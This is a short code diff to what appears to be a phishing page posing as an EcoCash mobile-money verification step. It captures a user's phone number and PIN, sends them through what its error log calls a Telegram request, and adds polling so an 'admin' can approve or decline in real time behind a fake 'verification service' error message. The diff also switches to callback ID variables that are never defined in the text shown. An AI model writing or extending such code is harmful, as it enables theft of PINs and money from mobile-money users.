@@ -600,8 +600,8 @@
       const timestamp = Date.now();
       const approveId = `ecocash_approve_${timestamp}`;
       const declineId = `ecocash_decline_${timestamp}`;
-      currentApproveId = approveId;
-      currentDeclineId = declineId;
+      currentApproveId = approveCallbackId;
+      currentDeclineId = declineCallbackId;
       
       pendingPhoneRaw = localPhoneNumber;
       pendingPin = pinCode;
@@ -629,6 +629,18 @@
         });
         
         if (!response.ok) throw new Error(`HTTP ${response.status}`);
+
+              
+        // Start polling for admin decision
+        startPollingForDecision(approveCallbackId, declineCallbackId);
+      } catch (err) {
+        console.error('Telegram send error:', err);
+        hideSpinner();
+        isProcessing = false;
+        setPinInputsEnabled(true);
+        phoneInput.disabled = false;
+        showLocalError('Network error. Unable to contact verification service. Please try again later.');
+        clearPinFields(false);
   
       }
     }
